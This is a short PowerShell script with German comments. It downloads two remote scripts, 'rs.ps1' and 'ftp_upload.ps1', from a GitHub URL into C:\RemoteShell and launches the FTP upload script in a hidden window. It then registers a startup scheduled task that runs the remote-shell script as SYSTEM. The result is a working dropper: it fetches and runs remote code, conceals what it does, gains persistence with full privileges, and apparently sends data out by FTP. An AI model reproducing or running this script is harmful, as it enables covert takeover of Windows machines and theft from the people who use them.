$rsUrl = "https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1"
$ftpUrl = "https://raw.githubusercontent.com/fiveraptor/rs/main/ftp_upload.ps1"
$zielSpeicherort = "C:\RemoteShell"

# Erstelle eine WebClient-Instanz
$webClient = New-Object System.Net.WebClient

# Lade das rs.ps1-Skript herunter und speichere es am gewünschten Speicherort
$rsScriptPath = Join-Path $zielSpeicherort "rs.ps1"
$webClient.DownloadFile($rsUrl, $rsScriptPath)

# Lade das ftp_upload.ps1-Skript herunter und speichere es am gewünschten Speicherort
$ftpScriptPath = Join-Path $zielSpeicherort "ftp_upload.ps1"
$webClient.DownloadFile($ftpUrl, $ftpScriptPath)

# Starte das ftp_upload.ps1-Skript im Hintergrund
Start-Process -FilePath "powershell.exe" -ArgumentList "-File $ftpScriptPath" -WindowStyle Hidden

Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File "C:\RemoteShell\rs.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName "rs" -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings (New-ScheduledTaskSettingsSet  -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

Start-ScheduledTask -TaskName "rs"

